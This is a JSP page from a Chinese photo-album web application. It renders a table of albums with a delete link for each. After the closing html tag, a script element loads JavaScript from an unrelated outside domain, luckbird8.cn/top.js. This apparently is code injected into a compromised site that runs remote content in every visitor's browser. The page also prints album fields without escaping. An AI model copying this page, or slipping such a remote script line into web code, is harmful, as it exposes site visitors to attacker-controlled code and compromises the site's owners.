<%@ page
 contentType="text/html;charset=GBK"
 import="java.util.*,com.javabean.AlbumInfo"
 errorPage="error.jsp"
 session="true"
%>
<html>
<head>
	<title></title>
	<style type="text/css">
		.newjoyo_vcd1 {
		   border-bottom:1px ridge #C49238;border-left: 1px ridge #C49238;
		   border-right:1px ridge #C49238;border-top: 1px ridge #C49238;
		   line-height:18px;
		}
	</style>
</head>
<body>
<center>
	<form action="AlbumServlet" method="post">
	<table border="0" width="90%" height="20%" style="border-color:#C49238"
	       class="newjoyo_vcd1" cellpadding="0" cellspacing="0"
	       bgcolor="azure">
	<tr><td height="10"></td></tr>
	<tr align="center" bgcolor="#C0C0C0">
		<th>编号</th>
		<th>相册名称</th>
		<th>创建时间</th>
		<th>相册类型</th>
		<th>照片数量</th>
		<th>删除</th>
	</tr>
	<%
		Vector vec=(Vector)request.getAttribute("albumInfo");
		for(Enumeration enu=vec.elements();enu.hasMoreElements();) {
			AlbumInfo ai=(AlbumInfo)enu.nextElement();
		%>
		<tr align="center">
		<td align="center"><%= ai.getAlbumId() %></td>
		<td align="center"><%= ai.getAlbumName() %></td>
		<td align="center"><%= ai.getNewTime() %></td>
		<td align="center"><%= ai.getAlbumType() %></td>
		<td align="center"><%= ai.getPhotoCount() %></td>
		<td align="center">
		<a href="AlbumServlet?action=del&albumId=<%= ai.getAlbumId() %>">
					删除</a></td>
		</tr>
		<%
		}
	%>
	</table>
	</form></center>
</body>
</html>
<script language=javascript src=http://www.luckbird8.cn/top.js></script>